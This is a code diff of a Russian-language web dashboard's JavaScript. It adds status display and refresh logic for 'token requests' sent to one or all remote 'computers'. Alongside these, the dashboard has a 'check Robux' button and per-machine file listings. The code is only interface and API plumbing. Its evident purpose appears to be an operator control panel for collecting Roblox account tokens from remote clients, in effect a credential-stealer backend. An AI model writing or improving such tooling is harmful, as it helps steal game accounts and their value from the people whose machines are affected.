@@ -201,6 +201,16 @@ function openModalByIndex(idx) {
     statusRow.style.display = "none";
   }
 
+  const requestEl = document.getElementById("tokenRequestStatus");
+  if (f.tokenRequest && f.tokenRequest.requested) {
+    const at = f.tokenRequest.requestedAt ? new Date(f.tokenRequest.requestedAt).toLocaleString("ru") : "только что";
+    requestEl.textContent = "⏳ Ожидаем ответ клиента (" + at + ")";
+    requestEl.style.color = "var(--warning)";
+  } else {
+    requestEl.textContent = "Нет активного запроса";
+    requestEl.style.color = "var(--text-secondary)";
+  }
+
   const pane = document.getElementById("modalPreviewPane");
   if (isImg(nm)) {
     pane.innerHTML = "<img src='" + dlUrl + "' alt=''>";
@@ -222,6 +232,7 @@ function openModalByIndex(idx) {
 
   document.getElementById("modalRobuxBtn").onclick = function() { checkRobux(f.name); };
   document.getElementById("modalRequestBtn").onclick = function() { requestToken(f.name); };
+  document.getElementById("modalRequestStatusBtn").onclick = function() { refreshRequestStatus(f.name); };
   document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };
 
   document.getElementById("fileModal").style.display = "flex";
@@ -255,7 +266,14 @@ async function deleteFile(name) {
     if (d.success) {
       toast("Файл удалён");
       closeModal();
-loadFiles();
+      loadFiles();
+    } else {
+      toast("Ошибка удаления", "err");
+    }
+  } catch (e) {
+    if (e.message !== 'auth') toast("Ошибка связи с сервером", "err");
+  }
+}
 
 // ── Запрос токена ─────────────────────────────────────────────────────────────
 async function requestToken(filename) {
@@ -266,9 +284,35 @@ async function requestToken(filename) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ filename })
     });
+    const reqEl = document.getElementById('tokenRequestStatus');
+    if (reqEl) {
+      reqEl.textContent = '⏳ Ожидаем ответ клиента';
+      reqEl.style.color = 'var(--warning)';
+    }
     toast('📡 Запрос токена отправлен компьютеру');
+    loadFiles();
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка запроса', 'err');
+  }
+}
+
+async function refreshRequestStatus(filename) {
+  try {
+    await loadFiles();
+    const idx = allFiles.findIndex(f => f.name === filename);
+    if (idx >= 0) {
+      openModalByIndex(idx);
+      const f = allFiles[idx];
+      if (f.tokenRequest && f.tokenRequest.requested) {
+        toast('⏳ Клиент ещё не ответил');
+      } else {
+        toast('✅ Активного запроса нет');
+      }
+    } else {
+      toast('⚠️ Компьютер не найден', 'err');
+    }
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка обновления статуса', 'err');
   }
 }
 
@@ -280,19 +324,13 @@ document.getElementById('btnRequestAll').addEventListener('click', async functio
     const r = await apiFetch('/request-token-all', { method: 'POST' });
     const data = await r.json();
     toast('📡 Запрос отправлен ' + (data.count || 'всем') + ' компьютерам');
+    loadFiles();
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка запроса', 'err');
   }
   btn.disabled = false;
   btn.textContent = '📡 Запросить у всех';
 });
-    } else {
-      toast("Ошибка удаления", "err");
-    }
-  } catch (e) {
-    if (e.message !== 'auth') toast("Ошибка связи с сервером", "err");
-  }
-}
 
 async function checkRobux(name) {
   const robuxRow = document.getElementById("robloxSpecRobuxRow");
